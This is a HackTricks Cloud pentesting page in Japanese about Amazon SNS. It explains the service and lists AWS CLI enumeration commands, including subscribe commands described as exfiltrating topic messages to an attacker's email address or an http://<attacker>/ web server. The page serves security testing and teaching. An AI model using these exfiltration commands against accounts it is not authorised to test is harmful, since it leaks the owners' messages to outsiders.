# AWS - SNS Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SNS

Amazon Simple Notification Service (Amazon SNS) は、**フルマネージドメッセージングサービス**として説明されています。これは、**アプリケーション間** (A2A) および **アプリケーションから人** (A2P) への通信タイプの両方をサポートします。

A2A通信の主な機能には、**パブリッシュ/サブスクライブ (pub/sub) メカニズム**が含まれます。これらのメカニズムは、**トピック**を導入し、高スループットの**プッシュベースの多対多メッセージング**を可能にします。この機能は、分散システム、マイクロサービス、およびイベント駆動のサーバーレスアーキテクチャを含むシナリオで非常に有利です。これらのトピックを活用することで、パブリッシャーシステムは**広範なサブスクライバーシステム**に効率的にメッセージを配信し、ファンアウトメッセージングパターンを促進します。

### **SQSとの違い**

**SQS** は、ポイントツーポイント通信を可能にする**キューベースのサービス**であり、メッセージが**単一のコンシューマー**によって処理されることを保証します。これは、**少なくとも一度の配信**を提供し、標準およびFIFOキューをサポートし、再試行および遅延処理のためのメッセージ保持を可能にします。\
一方、**SNS** は、**パブリッシュ/サブスクライブベースのサービス**であり、メッセージを**複数のサブスクライバー**に同時にブロードキャストすることにより、**一対多**の通信を可能にします。これは、**メール、SMS、Lambda関数、およびHTTP/HTTPSなどのさまざまなサブスクリプションエンドポイント**をサポートし、ターゲットメッセージ配信のためのフィルタリングメカニズムを提供します。\
両方のサービスは分散システム内のコンポーネント間のデカップリングを可能にしますが、SQSはキュー通信に焦点を当て、SNSはイベント駆動のファンアウト通信パターンを強調します。

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**トピックがFIFOタイプの場合**、プロトコル**SQS**を使用するサブスクライバーのみが使用できます（HTTPまたはHTTPSは使用できません）。

また、`--topic-arn`にリージョンが含まれていても、**`--region`**に正しいリージョンを指定しないと、アクセス権がないことを示すエラーが発生しますが、問題はリージョンにあります。
{% endhint %}

#### 認証されていないアクセス

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### 権限昇格

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### ポストエクスプロイト

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### 永続性

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## 参考文献

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
AWSハッキングを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
{% endhint %}
